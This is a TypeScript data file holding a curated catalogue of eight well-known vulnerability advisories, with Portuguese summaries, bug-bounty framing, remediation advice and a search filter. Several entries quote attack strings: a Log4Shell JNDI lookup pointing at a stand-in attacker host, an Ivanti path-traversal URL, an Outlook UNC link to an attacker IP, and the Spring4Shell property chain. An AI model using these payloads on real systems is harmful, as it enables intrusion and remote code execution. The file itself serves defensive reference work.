import { Severity } from '../types';

export interface SecurityAdvisoryItem {
  id: string;
  title: string;
  source: string;
  sourceUrl: string;
  publishedDate: string;
  severity: Severity;
  category: string;
  cveIds: string[];
  cweIds: string[];
  affectedVendors: string[];
  summary: string;
  technicalExploitContext: string;
  bugBountyContext: string;
  matchedVulnerabilityTypes?: string[];
  remediation?: string;
}

export const DEFAULT_CURATED_SECURITY_ADVISORIES: SecurityAdvisoryItem[] = [
  {
    id: "ADV-2024-001",
    title: "CISA KEV Alert: Active Exploitation of PAN-OS GlobalProtect Command Injection (CVE-2024-3400)",
    source: "CISA Cybersecurity Advisories & KEV",
    sourceUrl: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a",
    publishedDate: "2024-04-16",
    severity: "CRITICAL",
    category: "Zero-Day / Exploit",
    cveIds: ["CVE-2024-3400"],
    cweIds: ["CWE-77: Command Injection", "CWE-20: Improper Input Validation"],
    affectedVendors: ["Palo Alto Networks", "PAN-OS 10.2", "PAN-OS 11.0", "PAN-OS 11.1"],
    summary: "CISA adicionou ao catálogo KEV a falha crítica de injeção de comandos no Palo Alto Networks PAN-OS GlobalProtect gateway. Atacantes remotos não autenticados conseguem executar comandos no sistema operacional com privilégios de root.",
    technicalExploitContext: "A falha reside no processamento de parâmetros de sessão e telemetria enviados através de requisições HTTP para o endpoint do GlobalProtect Portal/Gateway, permitindo que caracteres de quebra de comando shell executem comandos bash no host subjacente.",
    bugBountyContext: "Fornece forte contexto para relatórios de injeção de comando em appliances perimetrais. Demonstra que falhas em interfaces de autenticação e telemetria possuem prioridade de triagem imediata (P1 / Critical) com pagamento de bounties máximos.",
    matchedVulnerabilityTypes: ["Command Injection", "RCE", "Remote Code Execution", "OS Command Injection", "CWE-77"],
    remediation: "Aplicar hotfixes imediatos fornecidos pela Palo Alto Networks ou desabilitar temporariamente a telemetria do dispositivo até a atualização completa."
  },
  {
    id: "ADV-2024-002",
    title: "Ivanti Connect Secure & Policy Secure Authentication Bypass and Remote Code Execution (CVE-2023-46805 & CVE-2024-21887)",
    source: "NIST NVD & CISA Emergency Directive",
    sourceUrl: "https://nvd.nist.gov/vuln/detail/CVE-2023-46805",
    publishedDate: "2024-01-15",
    severity: "CRITICAL",
    category: "Auth Bypass / RCE",
    cveIds: ["CVE-2023-46805", "CVE-2024-21887"],
    cweIds: ["CWE-287: Improper Authentication", "CWE-78: OS Command Injection"],
    affectedVendors: ["Ivanti", "Connect Secure", "Policy Secure", "Pulse Connect"],
    summary: "A combinação de desvio de autenticação no componente web de gerenciamento com injeção de comandos em APIs REST internas permite que atores maliciosos executem comandos arbitrários e instalem backdoors persistentes.",
    technicalExploitContext: "O atacante envia uma requisição manipulada ao caminho /api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test contornando os filtros de autorização do proxy reverso por meio de path traversal e disparando comandos no backend.",
    bugBountyContext: "Excelente analogia para relatórios de Broken Object Level Authorization (BOLA/IDOR) e Path Traversal que levam a endpoints administrativos sensíveis. Use para fundamentar o risco sistêmico de desvios de middleware em APIs.",
    matchedVulnerabilityTypes: ["Broken Access Control", "Auth Bypass", "Authentication Bypass", "IDOR", "BOLA", "Path Traversal", "CWE-287", "CWE-639"],
    remediation: "Importar o arquivo de mitigação fornecido pela Ivanti ou atualizar o firmware para builds com validação de caminho canônico e isolamento de rotas de manutenção."
  },
  {
    id: "ADV-2024-003",
    title: "MonikerLink: Critical Microsoft Outlook Remote Code Execution via Malicious Mailto Hyperlink (CVE-2024-21413)",
    source: "Microsoft Security Response Center (MSRC)",
    sourceUrl: "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-21413",
    publishedDate: "2024-02-13",
    severity: "CRITICAL",
    category: "Remote Code Execution",
    cveIds: ["CVE-2024-21413"],
    cweIds: ["CWE-94: Improper Control of Generation of Code", "CWE-200: Exposure of Sensitive Information"],
    affectedVendors: ["Microsoft Office 2016", "Office 2019", "Office LTSC", "Microsoft 365 Apps"],
    summary: "Vulnerabilidade no processamento de links monikers com a tag 'file:///' ou esquemas especiais contorna o Modo de Exibição Protegido do Office e força a autenticação SMB com vazamento de hash NTLM ou execução de DLL remota.",
    technicalExploitContext: "Ao incluir um ponto de exclamação no link apontando para um compartilhamento SMB/UNC (ex: file:///\\\\attacker-ip\\share\\doc.docx!something), o Outlook ignora as verificações de confiança e interage com o recurso externo.",
    bugBountyContext: "Contexto essencial para pesquisas envolvendo SSRF e vazamento de credenciais via manipulação de esquemas de URL em campos de entrada de rich text, webhooks ou previewers de documentos.",
    matchedVulnerabilityTypes: ["SSRF", "Server-Side Request Forgery", "Information Disclosure", "NTLM Leak", "CWE-918", "CWE-200"],
    remediation: "Instalar a atualização cumulativa do Patch Tuesday de Fevereiro de 2024 e bloquear portas SMB de saída (TCP 445) no firewall perimetral."
  },
  {
    id: "ADV-2024-004",
    title: "Atlassian Confluence Server & Data Center Critical Broken Access Control (CVE-2023-22515)",
    source: "Atlassian Security Advisory",
    sourceUrl: "https://confluence.atlassian.com/security/cve-2023-22515-broken-access-control-vulnerability-in-confluence-data-center-and-server-1295682276.html",
    publishedDate: "2023-10-04",
    severity: "CRITICAL",
    category: "Broken Access Control",
    cveIds: ["CVE-2023-22515"],
    cweIds: ["CWE-284: Improper Access Control", "CWE-306: Missing Authentication"],
    affectedVendors: ["Atlassian Confluence Data Center", "Atlassian Confluence Server 8.0 - 8.5.1"],
    summary: "Falha gravíssima de controle de acesso permite que invasores remotos sem autenticação acessem o endpoint do assistente de configuração (/setup/setupadministrator.action) e criem novas contas administrativas com controle irrestrito.",
    technicalExploitContext: "O framework Struts2/XWork do Confluence não aplicava validações de sessão adequadas em rotas de setup quando o parâmetro de bootstrap do sistema era acionado em requisições GET/POST manipuladas com cabeçalhos de encaminhamento.",
    bugBountyContext: "Modelo perfeito para provar severidade CRITICAL (CVSS 10.0) em relatórios de cadastro de administradores não autorizados ou rotas de inicialização expostas. Use para justificar que ausência de autenticação em endpoints de setup equivale a comprometimento total.",
    matchedVulnerabilityTypes: ["Broken Access Control", "Privilege Escalation", "Missing Authentication", "Account Takeover", "CWE-284", "CWE-306"],
    remediation: "Atualizar imediatamente para as versões 8.3.3, 8.4.3 ou 8.5.2 do Confluence ou restringir o acesso externo a endpoints /setup/* no proxy reverso."
  },
  {
    id: "ADV-2024-005",
    title: "Apache Log4j2 JNDI Remote Code Execution (Log4Shell - CVE-2021-44228)",
    source: "Apache Software Foundation & NIST NVD",
    sourceUrl: "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
    publishedDate: "2021-12-10",
    severity: "CRITICAL",
    category: "Zero-Day / Exploit",
    cveIds: ["CVE-2021-44228", "CVE-2021-45046"],
    cweIds: ["CWE-502: Deserialization of Untrusted Data", "CWE-94: Code Injection"],
    affectedVendors: ["Apache Software Foundation", "Log4j 2.0 - 2.14.1", "Java Ecosystem"],
    summary: "Falha nos recursos de lookup JNDI do Log4j2 permite que strings de log como '${jndi:ldap://attacker.com/a}' forcem a JVM a buscar e executar bytecode Java remoto arbitrário.",
    technicalExploitContext: "A interpolação recursiva de mensagens de log do MessagePatternConverter processa expressões JNDI em qualquer cabeçalho HTTP (User-Agent, X-Forwarded-For) ou parâmetro de consulta que seja gravado nos logs da aplicação.",
    bugBountyContext: "O padrão-ouro para demonstrar o risco de injeções indiretas e desserialização insegura em pipelines de telemetria e logging. Fundamental para relatórios que demonstram impacto de injeção em camadas não diretamente acessíveis ao usuário.",
    matchedVulnerabilityTypes: ["Insecure Deserialization", "RCE", "Remote Code Execution", "JNDI Injection", "CWE-502"],
    remediation: "Atualizar para Log4j 2.17.1+ ou configurar a propriedade de sistema log4j2.formatMsgNoLookups=true em instâncias legadas."
  },
  {
    id: "ADV-2024-006",
    title: "OWASP API Security Advisory: Broken Object Level Authorization (BOLA/IDOR) Remains #1 Threat in Modern APIs",
    source: "OWASP API Security Project",
    sourceUrl: "https://owasp.org/www-project-api-security/",
    publishedDate: "2024-01-20",
    severity: "HIGH",
    category: "API & Web Security",
    cveIds: ["CVE-2023-22515", "CVE-2023-38606"],
    cweIds: ["CWE-639: Authorization Bypass Through User-Controlled Key", "CWE-284: Improper Access Control"],
    affectedVendors: ["GraphQL APIs", "REST APIs", "Fintech Endpoints", "Healthcare Platforms"],
    summary: "Aviso do projeto OWASP API Top 10 destaca que falhas de validação de propriedade em identificadores diretos de recursos (BOLA/IDOR) respondem por mais de 40% das recompensas máximas pagas em plataformas como HackerOne e Bugcrowd.",
    technicalExploitContext: "Endpoints de API aceitam identificadores numéricos ou UUIDs fornecidos pelo cliente no corpo ou parâmetros da URL sem cruzar com a chave de sessão do usuário logado, permitindo leitura e modificação em massa de registros de outros clientes.",
    bugBountyContext: "Contexto direto para embasar relatórios de IDOR em programas de bug bounty. O aviso reforça que triadores devem considerar a facilidade de exploração automatizada e a violação de privacidade de dados para conceder ratings HIGH ou CRITICAL.",
    matchedVulnerabilityTypes: ["IDOR", "BOLA", "Broken Object Level Authorization", "Broken Access Control", "CWE-639"],
    remediation: "Implementar validação de controle de acesso baseada em escopo e autorização granular na camada de repositório/ORM, garantindo que consultas filtrem sempre por userId da sessão."
  },
  {
    id: "ADV-2024-007",
    title: "Spring Framework Data Binding Remote Code Execution (Spring4Shell - CVE-2022-22965)",
    source: "VMware Tanzu & Spring Security Team",
    sourceUrl: "https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement",
    publishedDate: "2022-03-31",
    severity: "CRITICAL",
    category: "Remote Code Execution",
    cveIds: ["CVE-2022-22965"],
    cweIds: ["CWE-94: Improper Control of Generation of Code"],
    affectedVendors: ["Spring Framework 5.3.0 - 5.3.17", "Spring Framework 5.2.0 - 5.2.19", "Tomcat WAR Deployments"],
    summary: "Vulnerabilidade no mecanismo de data binding do Spring MVC permite sobrescrever propriedades de classe do Tomcat (como o AccessLogValve) via parâmetros HTTP comuns, criando web shells no diretório raiz do servidor web.",
    technicalExploitContext: "Exploração via 'class.module.classLoader.resources.context.parent.pipeline.first.pattern' direcionada ao Tomcat gera um arquivo .jsp executável dentro de /webapps/ROOT através do mecanismo nativo de rotação de logs.",
    bugBountyContext: "Fornece base para relatórios de Parameter Pollution e manipulação de propriedades de data-binding em aplicações Java/Spring. Evidencia que mesmo parâmetros aparentemente inofensivos podem ter impacto de Remote Code Execution.",
    matchedVulnerabilityTypes: ["Spring4Shell", "Data Binding", "RCE", "Remote Code Execution", "CWE-94"],
    remediation: "Atualizar para Spring Framework 5.3.18+ ou 5.2.20+ ou desabilitar o binding recursivo via InitBinder com campos restritos."
  },
  {
    id: "ADV-2024-008",
    title: "Progress MOVEit Transfer SQL Injection Vulnerability Exploited by Cl0p Ransomware (CVE-2023-34362)",
    source: "CISA Alert AA23-158A",
    sourceUrl: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-158a",
    publishedDate: "2023-06-07",
    severity: "CRITICAL",
    category: "Zero-Day / Exploit",
    cveIds: ["CVE-2023-34362"],
    cweIds: ["CWE-89: SQL Injection"],
    affectedVendors: ["Progress Software", "MOVEit Transfer 2021.0 - 2023.0"],
    summary: "Injeção de SQL não autenticada no aplicativo web MOVEit Transfer permitiu que o grupo de ransomware Cl0p exfiltrasse terabytes de dados confidenciais de centenas de organizações globais antes do lançamento do patch.",
    technicalExploitContext: "O endpoint moveitisapi.dll não sanitizava cabeçalhos HTTP personalizados passados para a instrução SQL no banco de dados MySQL/Azure SQL, permitindo escalonamento de privilégios e extração de chaves de criptografia de arquivos.",
    bugBountyContext: "Contextualiza a gravidade de falhas SQLi em portais corporativos de transferência de arquivos. Use para demonstrar que mesmo SQLi baseada em tempo (blind) em aplicações de borda resulta em compromisso de compliance e impacto máximo de ransomware.",
    matchedVulnerabilityTypes: ["SQLi", "SQL Injection", "Database Extraction", "CWE-89"],
    remediation: "Aplicar os patches emergenciais da Progress Software, inspecionar logs do IIS por requisições anômalas para /guestaccess.aspx e rotacionar todas as credenciais de banco de dados."
  }
];

export const DEFAULT_ADVISORY_SOURCES = [
  { title: "CISA Cybersecurity Advisories & KEV Catalog", url: "https://www.cisa.gov/news-events/cybersecurity-advisories" },
  { title: "NIST National Vulnerability Database (NVD)", url: "https://nvd.nist.gov" },
  { title: "BleepingComputer Security News", url: "https://www.bleepingcomputer.com" },
  { title: "The Hacker News - Cyber Security & Vulnerabilities", url: "https://thehackernews.com" },
  { title: "OWASP API Security Top 10", url: "https://owasp.org/www-project-api-security/" }
];

export function getFilteredCuratedAdvisories(
  query: string = '',
  category: string = 'all',
  targetFilter: string = '',
  vulnTypeFilter: string = ''
): SecurityAdvisoryItem[] {
  let filtered = [...DEFAULT_CURATED_SECURITY_ADVISORIES];

  if (category && category !== 'all') {
    const cat = category.toLowerCase();
    if (cat === 'zero_day') {
      filtered = filtered.filter(a => a.category.toLowerCase().includes('zero-day') || a.category.toLowerCase().includes('exploit'));
    } else if (cat === 'cisa_kev') {
      filtered = filtered.filter(a => a.source.toLowerCase().includes('cisa') || a.title.toLowerCase().includes('cisa'));
    } else if (cat === 'api_web') {
      filtered = filtered.filter(a => a.category.toLowerCase().includes('api') || a.category.toLowerCase().includes('access') || a.category.toLowerCase().includes('auth'));
    } else if (cat === 'ransomware') {
      filtered = filtered.filter(a => a.category.toLowerCase().includes('ransomware') || a.title.toLowerCase().includes('ransomware'));
    }
  }

  if (query && query.trim()) {
    const q = query.toLowerCase().trim();
    filtered = filtered.filter(a =>
      a.title.toLowerCase().includes(q) ||
      a.summary.toLowerCase().includes(q) ||
      a.technicalExploitContext.toLowerCase().includes(q) ||
      a.cveIds.some(c => c.toLowerCase().includes(q)) ||
      a.affectedVendors.some(v => v.toLowerCase().includes(q)) ||
      (a.matchedVulnerabilityTypes || []).some(m => m.toLowerCase().includes(q))
    );
  }

  if (targetFilter && targetFilter.trim()) {
    const tf = targetFilter.toLowerCase().trim();
    filtered.sort((a, b) => {
      const aMatches = a.affectedVendors.some(v => tf.includes(v.toLowerCase()) || v.toLowerCase().includes(tf));
      const bMatches = b.affectedVendors.some(v => tf.includes(v.toLowerCase()) || v.toLowerCase().includes(tf));
      return (bMatches ? 1 : 0) - (aMatches ? 1 : 0);
    });
  }

  if (vulnTypeFilter && vulnTypeFilter.trim()) {
    const vf = vulnTypeFilter.toLowerCase().trim();
    filtered.sort((a, b) => {
      const aMatches = (a.matchedVulnerabilityTypes || []).some(m => m.toLowerCase().includes(vf));
      const bMatches = (b.matchedVulnerabilityTypes || []).some(m => m.toLowerCase().includes(vf));
      return (bMatches ? 1 : 0) - (aMatches ? 1 : 0);
    });
  }

  return filtered;
}
